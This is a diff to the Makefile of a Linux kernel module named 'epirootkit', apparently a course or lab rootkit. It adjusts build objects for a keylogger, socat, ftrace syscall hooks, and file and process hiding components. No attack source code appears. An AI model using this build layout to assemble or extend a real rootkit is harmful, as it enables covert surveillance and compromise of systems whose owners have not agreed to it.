@@ -5,6 +5,7 @@ ccflags-y := 								    \
         -I$(src) 							    \
 		-I$(src)/crypto						    \
 		-I$(src)/network					    \
+        -I$(src)/include 					    \
         -I$(src)/interceptor/core/include 	    \
         -I$(src)/interceptor/hooks/alterate     \
         -I$(src)/interceptor/hooks/forbid 	    \
@@ -18,13 +19,13 @@ epirootkit-objs :=                              \
     socat.o                                     \
     file_ops.o                                  \
     epikeylog.o                                 \
-    hider.o                                     \
     rootkit_command.o                           \
 	crypto/hash.o                               \
 	crypto/aes.o                                \
 	network/worker.o                            \
 	network/socket.o                            \
 	network/iostream.o                          \
+    interceptor/core/init.o                     \
     interceptor/core/array.o                    \
     interceptor/core/menu.o                     \
     interceptor/core/ftrace.o                   \
@@ -34,7 +35,7 @@ epirootkit-objs :=                              \
     interceptor/hooks/forbid/list.o             \
     interceptor/hooks/hide/hide.o               \
     interceptor/hooks/hide/list.o               \
-    interceptor/misc/fs.o
+    interceptor/misc/ghost.o
 
 all: modules
 
